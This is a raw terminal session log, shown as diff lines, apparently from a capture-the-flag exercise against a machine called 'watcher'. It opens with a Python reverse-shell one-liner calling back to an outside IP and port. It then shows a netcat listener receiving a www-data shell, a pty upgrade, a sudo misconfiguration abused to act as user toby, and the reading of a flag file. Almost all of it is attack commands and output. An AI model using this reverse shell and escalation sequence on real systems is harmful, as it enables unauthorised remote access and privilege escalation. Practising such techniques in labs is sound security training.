+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-04-09 12:51:20+03:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2025-04-09 12:55:08+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6749
+SOCKET: Shell has connected! PID: 2490
+[K[K[?2004hpython3 -c 'impoirt[K[K[Krt pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for www-data on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby ls /home/toby[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby ls /home/toby
+[Ksudo -u toby ls /home/toby
+[Kflag_4.txt  jobs  note.txt
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby ls /home/toby[C[C[1P /home/toby[1P /home/tobyc /home/tobya /home/tobyt /home/toby[C[C[C[C[C[C[C[C[C[C[C/flag4[K_4.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby cat /home/toby/flag_4.txt
+[Ksudo -u toby cat /home/toby/flag_4.txt
+[KFLAG{chad_lifestyle}
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby cat /home/toby/flag_4.txt[C[C[1P /home/toby/flag_4.txt[1P /home/toby/flag_4.txt[1P /home/toby/flag_4.txtl /home/toby/flag_4.txts /home/toby/flag_4.txt[C /home/toby/flag_4.txt- /home/toby/flag_4.txta /home/toby/flag_4.txtl /home/toby/flag_4.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby ls -al /home/toby
+[Ksudo -u toby ls -al /home/toby
+[Ktotal 44
+drwxr-xr-x 6 toby toby 4096 Dec 12  2020 .
+drwxr-xr-x 6 root root 4096 Dec  3  2020 ..
+lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 toby toby  220 Dec  3  2020 .bash_logout
+-rw-r--r-- 1 toby toby 3771 Dec  3  2020 .bashrc
+drwx------ 2 toby toby 4096 Dec  3  2020 .cache
+drwx------ 3 toby toby 4096 Dec  3  2020 .gnupg
+drwxrwxr-x 3 toby toby 4096 Dec  3  2020 .local
+-rw-r--r-- 1 toby toby  807 Dec  3  2020 .profile
+-rw------- 1 toby toby   21 Dec  3  2020 flag_4.txt
+drwxrwxr-x 2 toby toby 4096 Dec  3  2020 jobs
+-rw-r--r-- 1 mat  mat    89 Dec 12  2020 note.txt
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-04-09 12:58:59+03:00 [COMMAND_EXIT_CODE="0"]
